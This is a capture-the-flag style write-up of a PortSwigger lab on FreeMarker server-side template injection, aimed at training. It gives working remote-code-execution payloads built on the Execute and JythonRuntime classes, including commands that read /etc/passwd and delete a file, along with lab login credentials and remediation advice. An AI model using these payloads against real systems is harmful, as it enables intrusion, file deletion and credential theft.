# Lab 3: Server-Side Template Injection Using Documentation

**Category:** Server-Side Template Injection (SSTI)
**Difficulty:** Practitioner
**Lab link:** [Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

## Overview

The CMS product description editor passes user input into a FreeMarker template. The engine isn't identified upfront — you probe with common syntax, identify FreeMarker from the response, then consult its documentation to find `freemarker.template.utility.Execute`, a built-in class that runs arbitrary OS commands.

**Engine:** FreeMarker (Java)

## Key Concepts

- **Identify before exploiting:** different engines have different syntax and RCE primitives. Test polyglot probes (`${7*7}`, `{{7*7}}`, `<%= 7*7 %>`) to fingerprint the engine from which one evaluates.
- **FreeMarker syntax:**
  - `${expression}` — outputs expression result
  - `<#assign var=value>` — assigns a variable
  - `?new()` — instantiates a Java class by fully-qualified name
- **`freemarker.template.utility.Execute`** — a utility class in FreeMarker's standard library that accepts a string and executes it as a shell command. Available unless the template engine is locked down.

## FreeMarker Detection

| Probe | Expected output | Engine |
|---|---|---|
| `${7*7}` | `49` | FreeMarker, Pebble, Thymeleaf |
| `{{7*7}}` | `49` | Jinja2, Twig |
| `<%= 7*7 %>` | `49` | ERB |
| `${7*7}` + Java error | stack trace | FreeMarker confirmed |

## Solution

### Step 1 — Log in and find the injection point

Credentials: `content-manager` / `C0nt3ntM4n4g3r`. Navigate to a product → **Edit template**.

### Step 2 — Detect and identify

Add `${7*7}` to the template. If `49` renders → expression evaluation confirmed. FreeMarker errors include Java stack traces which further confirm the engine.

### Step 3 — RCE payload

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("rm /home/carlos/morale.txt")}
```

Paste into the template editor and save. The template renders immediately on save — command executes. Lab solved.

## How It Works

`"freemarker.template.utility.Execute"?new()` uses FreeMarker's `?new()` built-in to instantiate the `Execute` class. Calling the resulting object with a string argument runs that string as a shell command and returns its output.

```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}     → prints "uid=..."
${ex("cat /etc/passwd")}
${ex("rm /home/carlos/morale.txt")}
```

## Other FreeMarker RCE Primitives

```freemarker
<#-- Via freemarker.template.utility.JythonRuntime (if Jython present) -->
<#assign jython="freemarker.template.utility.JythonRuntime"?new()>
<@jython>import os; os.system("id")</@jython>

<#-- Via ?api to access underlying Java object -->
${product.getClass().getProtectionDomain().getCodeSource()}
```

## Remediation

- Use a sandboxed FreeMarker configuration that disables `?new()` and restricts class access.
- Block instantiation of dangerous classes like `Execute` via `TemplateClassResolver.SAFER_RESOLVER`.
- Never allow untrusted users to edit raw templates; use a restricted DSL instead.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/server-side-template-injection/lab-03-freemarker-documentation/solve.py)

Logs in as content-manager, fetches the product template, injects the Execute payload, and saves it.

## Key Takeaways

- FreeMarker's `?new()` built-in instantiates arbitrary Java classes — `Execute` is the standard RCE path.
- Identify the engine from probe responses and error messages before choosing an exploit.
- The PortSwigger SSTI decision tree: detect → identify (polyglot) → read docs → exploit.
